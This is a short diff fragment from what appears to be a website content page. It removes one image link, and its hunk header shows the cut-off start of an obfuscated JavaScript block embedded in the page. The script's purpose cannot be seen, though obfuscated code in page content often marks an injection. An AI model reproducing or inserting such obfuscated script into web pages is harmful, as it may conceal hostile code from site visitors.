@@ -44,4 +44,3 @@ var _0x29f9c7=_0x2230;(function(_0x202ec4,_0x264d99){var _0x392d21=_0x2230,_0x12
 </script>
 </div>
 
-![](/images/uploads/retribucion-noviembre-de-2021.png)
